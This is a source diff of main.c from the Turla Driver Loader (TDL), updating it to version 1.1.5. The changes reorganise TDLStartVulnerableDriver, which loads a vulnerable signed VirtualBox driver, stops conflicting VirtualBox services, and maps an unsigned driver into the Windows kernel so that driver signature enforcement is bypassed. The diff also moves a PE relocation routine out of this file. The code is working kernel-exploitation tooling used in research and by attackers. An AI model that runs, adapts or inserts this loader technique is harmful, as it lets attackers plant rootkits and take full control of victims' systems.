@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     1.14
+*  VERSION:     1.15
 *
-*  DATE:        05 Jan 2019
+*  DATE:        19 Apr 2019
 *
 *  Furutaka entry point.
 *
@@ -36,11 +36,11 @@ ULONG      g_NtBuildNumber = 0;
 #define supImageName    "furutaka"
 #define supImageHandle  0x1a000
 
-#define T_LOADERTITLE   TEXT("Turla Driver Loader v1.1.4 (05/01/19)")
+#define T_LOADERTITLE   TEXT("Turla Driver Loader v1.1.5 (19/04/19)")
 #define T_LOADERUNSUP   TEXT("Unsupported WinNT version\r\n")
 #define T_LOADERRUN     TEXT("Another instance running, close it before\r\n")
 #define T_LOADERUSAGE   TEXT("Usage: loader DriverToLoad\n\re.g. loader mydrv.sys\r\n")
-#define T_LOADERINTRO   TEXT("Turla Driver Loader v1.1.4 started\r\n(c) 2016 - 2019 TDL Project\r\nSupported x64 OS : 7 and above\r\n")
+#define T_LOADERINTRO   TEXT("Turla Driver Loader v1.1.5 started\r\n(c) 2016 - 2019 TDL Project\r\nSupported x64 OS : 7 and above\r\n")
 #define T_VBOXDETECT    TEXT("Ldr: Detected VirtualBox software installation, driver backup will be done")
 
 /*
@@ -69,62 +69,6 @@ BOOL TDLVBoxInstalled(
     }
 
     return bPresent;
-}
-
-/*
-* TDLRelocImage
-*
-* Purpose:
-*
-* Process image relocs.
-*
-*/
-void TDLRelocImage(
-    _In_ ULONG_PTR Image,
-    _In_ ULONG_PTR NewImageBase
-)
-{
-    PIMAGE_OPTIONAL_HEADER   popth;
-    PIMAGE_BASE_RELOCATION   rel;
-    DWORD_PTR                delta;
-    LPWORD                   chains;
-    DWORD                    c, p, rsz;
-
-    popth = &RtlImageNtHeader((PVOID)Image)->OptionalHeader;
-
-    if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC)
-        if (popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
-        {
-            rel = (PIMAGE_BASE_RELOCATION)((PBYTE)Image +
-                popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
-
-            rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
-            delta = (DWORD_PTR)NewImageBase - popth->ImageBase;
-            c = 0;
-
-            while (c < rsz) {
-                p = sizeof(IMAGE_BASE_RELOCATION);
-                chains = (LPWORD)((PBYTE)rel + p);
-
-                while (p < rel->SizeOfBlock) {
-
-                    switch (*chains >> 12) {
-                    case IMAGE_REL_BASED_HIGHLOW:
-                        *(LPDWORD)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += (DWORD)delta;
-                        break;
-                    case IMAGE_REL_BASED_DIR64:
-                        *(PULONGLONG)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += delta;
-                        break;
-                    }
-
-                    chains++;
-                    p += sizeof(WORD);
-                }
-
-                c += rel->SizeOfBlock;
-                rel = (PIMAGE_BASE_RELOCATION)((PBYTE)rel + rel->SizeOfBlock);
-            }
-        }
 }
 
 /*
@@ -539,6 +483,10 @@ UINT TDLMapDriver(
     return result;
 }
 
+#define VBOXNETADP_SVC L"VBoxNetAdp"
+#define VBOXNETLWF_SVC L"VBoxNetLwf"
+#define VBOXUSBMON_SVC L"VBoxUSBMon"
+
 /*
 * TDLStartVulnerableDriver
 *
@@ -554,12 +502,16 @@ HANDLE TDLStartVulnerableDriver(
     PBYTE       DrvBuffer;
     ULONG       DataSize = 0, bytesIO;
     HANDLE      hDevice = INVALID_HANDLE_VALUE;
-    WCHAR       szDriverFileName[MAX_PATH * 2];
     SC_HANDLE   schSCManager = NULL;
     LPWSTR      msg;
 
+    WCHAR       szDriverFileName[MAX_PATH * 2];
+
     DrvBuffer = supQueryResourceData(1, g_hInstance, &DataSize);
-    while (DrvBuffer != NULL) {
+    if (DrvBuffer == NULL)
+        return INVALID_HANDLE_VALUE;
+
+    do {
 
         //lets give scm nice looking path so this piece of shit code from early 90x wont fuckup somewhere.
         RtlSecureZeroMemory(szDriverFileName, sizeof(szDriverFileName));
@@ -568,43 +520,41 @@ HANDLE TDLStartVulnerableDriver(
             break;
         }
 
-        schSCManager = OpenSCManager(NULL,
-            NULL,
-            SC_MANAGER_ALL_ACCESS
-        );
+        schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
         if (schSCManager == NULL) {
             cuiPrintText(TEXT("Ldr: Error opening SCM database"), TRUE);
             break;
         }
 
-        //lookup main vbox driver device, if found, try to unload all possible, unload order is sensitive
-        if (supIsObjectExists(L"\\Device", L"VBoxDrv")) {
+        //
+        // Lookup main vbox driver device, if found, try to unload all possible, unload order is sensitive
+        //
+        if (supIsObjectExists(L"\\Device", VBoxDrvSvc)) {
 
-            cuiPrintText(TEXT("Ldr: Active VirtualBox found in system, attempt unload it"), TRUE);
+            cuiPrintText(TEXT("Ldr: Active VirtualBox found in system, attempt stop (unload) it drivers"), TRUE);
 
-            if (scmStopDriver(schSCManager, TEXT("VBoxNetAdp"))) {
-
-                cuiPrintText(TEXT("SCM: VBoxNetAdp driver unloaded"), TRUE);
-
+            if (!supStopVBoxService(schSCManager, VBOXNETADP_SVC)) {
+                cuiPrintText(TEXT("SCM: Error stopping VBoxNetAdp, cannot continue"), TRUE);
+                break;
             }
-            if (scmStopDriver(schSCManager, TEXT("VBoxNetLwf"))) {
 
-                cuiPrintText(TEXT("SCM: VBoxNetLwf driver unloaded"), TRUE);
-
+            if (!supStopVBoxService(schSCManager, VBOXNETLWF_SVC)) {
+                cuiPrintText(TEXT("SCM: Error stopping VBoxNetLwf, cannot continue"), TRUE);
+                break;
             }
-            if (scmStopDriver(schSCManager, TEXT("VBoxUSBMon"))) {
 
-                cuiPrintText(TEXT("SCM: VBoxUSBMon driver unloaded"), TRUE);
-
+            if (!supStopVBoxService(schSCManager, VBOXUSBMON_SVC)) {
+                cuiPrintText(TEXT("SCM: Error stopping VBoxUSBMon, cannot continue"), TRUE);
+                break;
             }
 
             Sleep(1000);
 
-            if (scmStopDriver(schSCManager, TEXT("VBoxDrv"))) {
-
-                cuiPrintText(TEXT("SCM: VBoxDrv driver unloaded"), TRUE);
-
+            if (!supStopVBoxService(schSCManager, VBoxDrvSvc)) {
+                cuiPrintText(TEXT("SCM: Error stopping VBoxDrv, cannot continue"), TRUE);
+                break;
             }
+
         }
 
         //
@@ -649,8 +599,8 @@ HANDLE TDLStartVulnerableDriver(
         }
 
         cuiPrintText(msg, TRUE);
-        break;
-    }
+
+    } while (FALSE);
 
     //post cleanup
     if (schSCManager != NULL) {
@@ -783,7 +733,6 @@ UINT TDLProcessCommandLine(
 void TDLMain()
 {
 
-    BOOL            cond = FALSE;
     UINT            uResult = 0;
     LONG            x;
     OSVERSIONINFO   osv;
@@ -837,7 +786,7 @@ void TDLMain()
 
         uResult = TDLProcessCommandLine(GetCommandLine());
 
-    } while (cond);
+    } while (FALSE);
 
     InterlockedDecrement((PLONG)&g_lApplicationInstances);
     ExitProcess(uResult);
